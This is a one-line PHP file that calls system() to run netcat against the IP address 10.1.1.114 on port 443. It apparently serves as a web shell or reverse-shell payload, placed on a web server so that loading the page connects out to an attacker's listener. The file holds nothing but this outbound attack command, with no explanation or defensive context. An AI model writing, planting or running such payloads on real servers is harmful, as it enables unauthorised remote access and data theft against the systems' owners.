<?php

system('nc 10.1.1.114 443');

?>

